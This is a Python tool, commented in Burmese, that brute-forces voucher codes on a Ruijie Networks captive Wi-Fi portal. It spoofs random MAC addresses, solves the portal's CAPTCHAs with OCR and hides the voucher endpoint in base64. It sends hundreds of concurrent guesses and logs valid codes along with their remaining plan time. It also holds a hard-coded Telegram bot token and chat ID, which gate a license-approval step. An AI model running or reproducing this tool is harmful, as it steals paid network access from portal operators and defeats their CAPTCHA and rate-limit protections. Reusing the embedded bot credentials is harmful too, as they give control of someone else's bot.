import sys
sys.path.insert(0, '/usr/local/lib/python3.10/dist-packages')
import getpass
import os
import re
import sys
import time
import ping3
import base64
import random
import string
import aiohttp
import asyncio
import hashlib
import requests
import subprocess
import json
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from urllib.parse import unquote, urlparse, parse_qs
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from aiohttp import web

# ── Telegram License Config ──
TELEGRAM_BOT_TOKEN = "8286209354:AAHN8V8JR9dSGmr3eknk2Odxrw1w16CHzQI"
TELEGRAM_CHAT_ID = "7774402865"

LICENSE_FILE = ".license"
LOG_FILE = "scanner_history.txt"

# ── Original Nokey Config ──
ADMIN_ID = "8475105021"          # မသုံးတော့ဘူး (License system ကိုသုံးမယ်)
AUTH_FILE = "auth_list.json"     # မသုံးတော့ဘူး

# ── Global structures ──
user_data = {}
scan_running = False
stop_scan = False
success_texts = []
limited_texts = []
notify_setting = {}
session = None
_connector = None
_start_time = time.monotonic()
CONCURRENCY = 500
BATCH_SIZE = 2000
_voucher_sem = None
scan_task = None
current_mode = None
current_target = None
current_plan_filters = []

# ════════════════════════════════════════════════════════════
#  အောက်ကအပိုင်းက bypass5.py ထဲက License System ကိုကူးထည့်ထားတာ
# ════════════════════════════════════════════════════════════

def get_device_id():
    """စက်ကို သီးသန့် ID ထုတ်ပေးတယ် (bypass5.py အတိုင်း)"""
    id_file = ".device_id"
    if os.path.exists(id_file):
        try:
            with open(id_file, "r") as f:
                return f.read().strip()
        except:
            pass
    try:
        result = subprocess.check_output("whoami", shell=True, encoding='utf-8')
        device_id = result.strip()
        if device_id:
            clean_id = re.sub(r'[^A-Za-z0-9]', '', device_id).upper()
            clean_id = (clean_id[:6] if len(clean_id) >= 6 else clean_id.ljust(6, 'X'))
            new_id = f"STR-{clean_id}"
            with open(id_file, "w") as f:
                f.write(new_id)
            return new_id
    except:
        pass
    try:
        device_id = getpass.getuser()
        if device_id:
            clean_id = re.sub(r'[^A-Za-z0-9]', '', device_id).upper()
            clean_id = clean_id[:6].ljust(6, 'X')
            new_id = f"STR-{clean_id}"
            with open(id_file, "w") as f:
                f.write(new_id)
            return new_id
    except:
        pass
    random_id = "STR-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    with open(id_file, "w") as f:
        f.write(random_id)
    return random_id

def format_remaining(remaining):
    if remaining is None:
        return "Unknown"
    days = remaining.days
    hours = remaining.seconds // 3600
    minutes = (remaining.seconds % 3600) // 60
    if days > 0:
        return f"{days}d {hours}h"
    elif hours > 0:
        return f"{hours}h {minutes}m"
    else:
        return f"{minutes}m"

def get_license_status():
    """လိုင်စင်ဖိုင်ကိုဖတ်ပြီး သက်တမ်းစစ်တယ်"""
    if not os.path.exists(LICENSE_FILE):
        return None, None, None, None
    try:
        with open(LICENSE_FILE, "r") as f:
            data = f.read().strip().split("|")
            if len(data) != 2:
                return None, None, None, None
            key, exp_ts = data
            exp_dt = datetime.fromtimestamp(float(exp_ts))
            now = datetime.now()
            if now < exp_dt:
                return True, key, exp_dt, exp_dt - now
            else:
                return False, key, exp_dt, None
    except:
        return None, None, None, None

def save_license(key, days):
    exp_dt = datetime.now() + timedelta(days=days)
    with open(LICENSE_FILE, "w") as f:
        f.write(f"{key}|{exp_dt.timestamp()}")
    return exp_dt

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    params = {"timeout": 10, "offset": offset} if offset else {"timeout": 10}
    try:
        resp = requests.get(url, params=params, timeout=12)
        if resp.status_code == 200:
            return resp.json().get("result", [])
    except:
        pass
    return []

def request_license_via_telegram(user_key):
    """Admin ဆီကို ခွင့်ပြုချက်တောင်းပြီး အဖြေကိုစောင့်တယ်"""
    device_id = get_device_id()
    msg = f"🔑 *License Request*\n📱 Device: `{device_id}`\n🔐 Key: `{user_key}`\n\nReply: `/allow {user_key} <days>`"
    send_telegram_message(msg)
    print(f"\n📨 Request sent to Telegram. Waiting for admin approval...")
    print(f"⏳ Timeout: 120 seconds")
    
    last_update_id = None
    timeout = 120
    start = time.time()
    while time.time() - start < timeout:
        updates = get_updates(offset=last_update_id)
        for update in updates:
            last_update_id = update.get("update_id") + 1
            msg_obj = update.get("message")
            if msg_obj and str(msg_obj.get("chat", {}).get("id")) == TELEGRAM_CHAT_ID:
                text = msg_obj.get("text", "").strip()
                match = re.match(rf"^/allow\s+{re.escape(user_key)}\s+(\d+)$", text, re.I)
                if match:
                    days = int(match.group(1))
                    if days <= 0:
                        send_telegram_message(f"❌ Invalid days for {user_key}")
                        continue
                    exp_dt = save_license(user_key, days)
                    send_telegram_message(f"✅ License granted for `{user_key}`. Expires: {exp_dt.strftime('%Y-%m-%d')}")
                    return True
                else:
                    if text.lower().startswith("/deny") and user_key in text:
                        send_telegram_message(f"❌ License denied for {user_key}")
                        return False
        time.sleep(2)
    send_telegram_message(f"⏰ Timeout for {user_key}")
    return False

def write_log(message):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] {message}\n"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)

# ════════════════════════════════════════════════════════════
#  အောက်ကအပိုင်းက မူလ nokey.py ရဲ့ Core Functions အတိုင်းပါ
# ════════════════════════════════════════════════════════════

PLAN_RE = re.compile(r'^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$', re.IGNORECASE)

def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit in ('min', 'm'):
            total += val
    return total

def iter_codes(mode):
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        if length <= 7:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
        else:
            while True:
                yield ''.join(random.choices(string.digits, k=length))
        return
    if mode == "starlink":
        while True:
            part1 = ''.join(random.choices(string.ascii_uppercase, k=3))
            part2 = ''.join(random.choices(string.digits, k=3))
            part3 = ''.join(random.choices(string.digits, k=3))
            yield f"{part1}-{part2}-{part3}"
        return
    if mode == "starlink2":
        while True:
            part1 = ''.join(random.choices(string.digits, k=3))
            part2 = ''.join(random.choices(string.digits, k=3))
            part3 = ''.join(random.choices(string.digits, k=3))
            yield f"{part1}-{part2}-{part3}"
        return
    if mode == "ascii-lower":
        while True:
            yield ''.join(random.choices(string.ascii_lowercase, k=6))
    if mode == "all":
        chars = string.ascii_lowercase + string.digits
        while True:
            yield ''.join(random.choices(chars, k=6))
    raise ValueError(f"Unsupported scan mode: {mode}")

def print_progress(checked, total=None, speed=0, found=0, target=None, mode=None):
    if mode in ["starlink", "starlink2"]:
        mode_label = f"STARLINK-{mode.upper()}"
    else:
        mode_label = f"Mode-{mode}"
    
    if total:
        progress = (checked / total * 100) if total > 0 else 0
        bar = f"[{'█' * int(progress//2)}{'░' * (50 - int(progress//2))}]"
        status = f"{mode_label} {bar} {progress:.1f}%"
    else:
        status = f"{mode_label} | Checked: {checked:,}"
    
    status += f" | Found: {found}"
    if target:
        status += f"/{target}"
    status += f" | Speed: {speed:,.0f}/min"
    
    print(f"\r{' ' * 120}", end="")
    print(f"\r{status}", end="", flush=True)

# ── Captcha handling ──
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

async def Captcha_Image(session_obj, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

async def check_session_url(session_url):
    try:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
        return all(k in params for k in required)
    except:
        return False

def _parse_seconds(val):
    secs = int(val)
    hours = secs // 3600
    mins = (secs % 3600) // 60
    if hours > 0:
        return f"{hours}h {mins}m"
    elif mins > 0:
        return f"{mins}m"
    else:
        return f"{secs}s"

def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0:
        return "0m"
    if total_mins < 60:
        return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24:
        return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    rem_hours = hours % 24
    if days < 30:
        return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"

async def get_balance(session_id):
    url = f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}"
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={session_id}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            raw = await resp.text()
            if resp.status != 200:
                return "Error"
            try:
                data = json.loads(raw)
            except:
                return "N/A"
            candidates = [data]
            for nested_key in ['result', 'data']:
                if isinstance(data, dict) and isinstance(data.get(nested_key), dict):
                    candidates.append(data[nested_key])
            for d in candidates:
                if not isinstance(d, dict):
                    continue
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                    val = d.get(key)
                    if val is not None:
                        return _parse_minutes(val)
                for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft', 'remain_time']:
                    val = d.get(key)
                    if val is not None:
                        return _parse_seconds(val)
            return "N/A"
    except:
        return "N/A"

async def perform_check(session_url, code, plan_filters=None):
    global _connector
    global stop_scan

    if stop_scan:
        return None

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    session_id = None
    for attempt in range(3):
        if stop_scan:
            return None
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                continue
            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    if await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except:
                    continue
            if not auth_code:
                continue
            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
            except:
                return
        if response and 'request limited' in response:
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        plan_str = "N/A"
        try:
            fetched = await get_balance(session_id)
            if isinstance(fetched, str) and fetched not in ("N/A", "Error"):
                plan_str = fetched
        except:
            pass
        if plan_filters:
            code_mins = plan_to_minutes(plan_str)
            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                return None
        
        return {"code": code, "session_id": session_id, "plan": plan_str}
    elif 'STA' in response:
        return {"code": code, "status": "limited"}

async def run_bruteforce(mode, session_url, target=None, plan_filters=None):
    global stop_scan, scan_running, current_mode, current_target, current_plan_filters
    
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        print(f"❌ Error: {e}")
        return
    
    total = None
    if mode in ["6", "7"]:
        total = 10 ** int(mode)
    
    checked = 0
    found = 0
    limited_count = 0
    scan_start = time.monotonic()
    
    current_mode = mode
    current_target = target
    current_plan_filters = plan_filters or []
    
    print(f"\n🚀 Starting {mode} scan...")
    print(f"📌 Target: {target or 'All'}")
    if plan_filters:
        print(f"📋 Plan Filters: {', '.join(plan_filters)}")
    print("-" * 60)
    
    global _voucher_sem, CONCURRENCY, BATCH_SIZE
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    
    try:
        while not stop_scan:
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            
            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, plan_filters)
            
            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            
            for res in results:
                if res and isinstance(res, dict):
                    if "plan" in res:
                        found += 1
                        code = res["code"]
                        plan = res["plan"]
                        print(f"\n\n🎉✅ SUCCESS CODE FOUND!")
                        print(f"🔑 Code: {code}")
                        print(f"📋 Plan: {plan}")
                        print(f"📊 Total Found: {found}")
                        print(f"⏱️ Time: {datetime.now().strftime('%H:%M:%S')}")
                        print("-" * 50)
                        
                        try:
                            with open("found_codes.txt", "a") as f:
                                f.write(f"{code} | Plan: {plan} | Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        except:
                            pass
                        
                        success_texts.append({"code": code, "plan": plan})
                        
                        if target and found >= target:
                            print(f"\n🎯 Target reached: {found} codes found!")
                            stop_scan = True
                            return
                    elif res.get("status") == "limited":
                        limited_count += 1
                        limited_texts.append(res["code"])
                        print(f"\n⚠️ LIMITED: {res['code']}")
            
            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            
            print_progress(checked, total, speed, found, target, mode)
        
        if stop_scan:
            print(f"\n⏹️ Scan stopped!")
        else:
            print(f"\n✅ Scan completed! Found: {found} codes")
        
        print(f"📊 Total checked: {checked}")
        print(f"🎯 Success codes: {found}")
        print(f"⚠️ Limited codes: {limited_count}")
        
    except KeyboardInterrupt:
        print(f"\n⏹️ Scan interrupted by user!")
    finally:
        scan_running = False
        stop_scan = False

# ── Command functions ──

def show_help():
    print("\n📚 Available Commands:")
    print("=" * 50)
    print("  setup <url>        - Set session URL")
    print("  brute <mode> [target] [plan] - Start scanning")
    print("  multibrute <mode> <layers> [target] - Multi-layer scan")
    print("  stop               - Stop current scan")
    print("  saved              - Show saved codes")
    print("  notify on/off      - Toggle notifications")
    print("  speed <number>     - Change speed (default: 500)")
    print("  status             - Show bot status")
    print("  help               - Show this help")
    print("  exit/quit          - Exit program")
    print("=" * 50)
    print("\nExamples:")
    print("  brute 7 10 1d      - Scan 7-digit codes, find 10 with 1d+ plan")
    print("  brute 8            - Scan 8-digit codes")
    print("  brute starlink     - Scan Starlink codes")
    print("  multibrute 7 3 10  - 3 layers of 7-digit scan, find 10 each")
    print()

async def handle_setup(url):
    print("Checking session URL...")
    if await check_session_url(url):
        user_data["session_url"] = url
        print("✅ Session URL saved!")
        return True
    else:
        print("❌ Invalid session URL")
        return False

async def start_brute_scan(mode, target=None, plan_filters=None):
    global scan_running, stop_scan, scan_task
    
    if scan_running:
        print("⚠️ A scan is already running! Use 'stop' to stop it first.")
        return
    
    if "session_url" not in user_data:
        print("⚠️ Please setup session URL first: setup <url>")
        return
    
    stop_scan = False
    scan_running = True
    
    scan_task = asyncio.create_task(
        run_bruteforce(
            mode,
            user_data["session_url"],
            target,
            plan_filters or []
        )
    )
    await scan_task

async def multi_brute(mode, layers, target=None):
    global scan_running, stop_scan
    
    if scan_running:
        print("⚠️ A scan is already running! Use 'stop' to stop it first.")
        return
    
    if "session_url" not in user_data:
        print("⚠️ Please setup session URL first: setup <url>")
        return
    
    if layers > 10:
        print("⚠️ Max layers is 10")
        return
    
    print(f"\n🔄 Starting {layers}-layer scan...")
    print(f"📌 Mode: {mode}")
    print(f"🎯 Target: {target or 'All'}")
    print("=" * 60)
    
    total_found = 0
    before_count = len(success_texts)
    
    for layer in range(1, layers + 1):
        if stop_scan:
            print(f"\n⏹️ Layer {layer} stopped")
            break
        
        print(f"\n📊 Layer {layer}/{layers} starting...")
        
        stop_scan = False
        scan_running = True
        
        await run_bruteforce(
            mode,
            user_data["session_url"],
            target,
            []
        )
        
        layer_found = len(success_texts) - before_count
        total_found += layer_found
        before_count = len(success_texts)
        
        print(f"\n✅ Layer {layer} completed!")
        print(f"🔍 Found: {layer_found}")
        print(f"📦 Total: {total_found}")
    
    print(f"\n🎯 ALL COMPLETED!")
    print(f"📦 Total Codes: {total_found}")
    print("=" * 60)
    
    scan_running = False
    stop_scan = False

def show_saved():
    if not success_texts:
        print("❌ No codes found yet")
        return
    
    print(f"\n🎉 Success Codes ({len(success_texts)})")
    print("=" * 50)
    for idx, item in enumerate(success_texts, 1):
        code = item.get('code', 'N/A')
        plan = item.get('plan', 'N/A')
        print(f"{idx}. {code} | Plan: {plan}")
    print("=" * 50)

def show_status():
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    print(f"\n📊 Bot Status")
    print("=" * 40)
    print(f"⏱ Uptime: {hours}h {minutes}m {seconds}s")
    print(f"🔍 Scan Running: {scan_running}")
    print(f"📌 Current Mode: {current_mode or 'None'}")
    print(f"🎯 Current Target: {current_target or 'All'}")
    print(f"📋 Current Filters: {', '.join(current_plan_filters) or 'None'}")
    print(f"✅ Codes Found: {len(success_texts)}")
    print(f"⚡ Current Speed: {CONCURRENCY}")
    print("=" * 40)

def load_saved_results():
    global success_texts
    try:
        if os.path.exists("found_codes.txt"):
            with open("found_codes.txt", "r") as f:
                for line in f:
                    if "|" in line:
                        parts = line.split("|")
                        code = parts[0].strip()
                        plan = parts[1].replace("Plan:", "").strip()
                        success_texts.append({"code": code, "plan": plan})
    except:
        pass

# ── WEB SERVER ──
async def web_server():
    app = web.Application()
    app.router.add_get('/', lambda request: web.Response(text="Voucher Scanner is running!"))
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 5000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"✅ Web server running on port {port}")

# ── Command Handler (License Check ထည့်ထားတယ်) ──
async def command_handler():
    global stop_scan, CONCURRENCY, scan_running

    # ---- License Check (bypass5.py ပုံစံ) ----
    valid, key, exp_dt, remaining = get_license_status()
    
    if valid is True:
        print(f"\n✅ License Active! Expires in: {format_remaining(remaining)}")
        print(f"📱 Device: {get_device_id()}")
    else:
        if valid is False:
            print(f"\n❌ License Expired! Please re-activate.")
            os.remove(LICENSE_FILE)
        
        print(f"\n🔑 No valid license found. Please enter your key.")
        user_key = input("> Enter License Key: ").strip()
        if not user_key:
            print("❌ Key cannot be empty.")
            sys.exit(1)
        
        if request_license_via_telegram(user_key):
            print("✅ License activated successfully!")
            valid, key, exp_dt, remaining = get_license_status()
            if valid:
                print(f"✅ Expires on: {exp_dt.strftime('%Y-%m-%d %H:%M:%S')}")
        else:
            print("❌ Activation failed. Exiting.")
            sys.exit(1)

    print("\n" + "=" * 50)
    print("🤖 Voucher Scanner Started!")
    print("📌 Type 'help' for commands")
    print("🔒 License System Active (Telegram Approval)")
    print("-" * 50)
    
    while True:
        try:
            cmd = input("\n> ").strip().lower()
            if not cmd:
                continue
            
            parts = cmd.split()
            command = parts[0]
            
            if command == "exit" or command == "quit":
                stop_scan = True
                print("👋 Goodbye!")
                break
            
            elif command == "help":
                show_help()
            
            elif command == "setup":
                if len(parts) < 2:
                    print("Usage: setup <session_url>")
                else:
                    await handle_setup(parts[1])
            
            elif command == "brute":
                if len(parts) < 2:
                    print("Usage: brute <mode> [target] [plan]")
                    print("Example: brute 7 10 1d")
                else:
                    mode = parts[1]
                    target = None
                    plan_filters = []
                    idx = 2
                    if idx < len(parts) and not PLAN_RE.match(parts[idx]):
                        try:
                            target = int(parts[idx])
                            idx += 1
                        except:
                            print("❌ Target must be a number")
                            continue
                    for arg in parts[idx:]:
                        if PLAN_RE.match(arg):
                            plan_filters.append(arg)
                        else:
                            print(f"❌ '{arg}' is not a valid plan format")
                            continue
                    await start_brute_scan(mode, target, plan_filters)
            
            elif command == "multibrute":
                if len(parts) < 3:
                    print("Usage: multibrute <mode> <layers> [target]")
                    print("Example: multibrute 7 3 10")
                else:
                    mode = parts[1]
                    try:
                        layers = int(parts[2])
                    except:
                        print("❌ Layers must be a number")
                        continue
                    target = None
                    if len(parts) > 3:
                        try:
                            target = int(parts[3])
                        except:
                            pass
                    await multi_brute(mode, layers, target)
            
            elif command == "stop":
                if scan_running:
                    stop_scan = True
                    print("⏹️ Stopping scan...")
                    if scan_task:
                        scan_task.cancel()
                    scan_running = False
                else:
                    print("No scan running")
            
            elif command == "saved":
                show_saved()
            
            elif command == "notify":
                if len(parts) < 2:
                    print("Usage: notify on/off")
                else:
                    state = parts[1].lower()
                    if state == "on":
                        notify_setting["default"] = True
                        print("✅ Notifications: ON")
                    elif state == "off":
                        notify_setting["default"] = False
                        print("✅ Notifications: OFF")
                    else:
                        print("Invalid state. Use 'on' or 'off'")
            
            elif command == "speed":
                if len(parts) < 2:
                    print(f"📊 Current Speed: {CONCURRENCY}")
                else:
                    try:
                        new_speed = int(parts[1])
                        if new_speed < 10:
                            print("❌ Speed must be > 10")
                        elif new_speed > 2000:
                            print("⚠️ Speed > 2000 may crash VPS")
                        else:
                            CONCURRENCY = new_speed
                            global _voucher_sem
                            _voucher_sem = asyncio.Semaphore(CONCURRENCY)
                            print(f"✅ Speed set to: {new_speed}")
                    except ValueError:
                        print("❌ Invalid number")
            
            elif command == "status":
                show_status()
            
            else:
                print(f"❌ Unknown command: {command}")
                print("Type 'help' for available commands")
                
        except KeyboardInterrupt:
            stop_scan = True
            print("\n👋 Goodbye!")
            break
        except Exception as e:
            print(f"❌ Error: {e}")

# ── Main ──
async def main():
    global session, _connector
    
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=True)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    
    try:
        load_saved_results()
        asyncio.create_task(web_server())
        await command_handler()
        
    finally:
        if session:
            await session.close()
        if _connector:
            await _connector.close()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Goodbye!")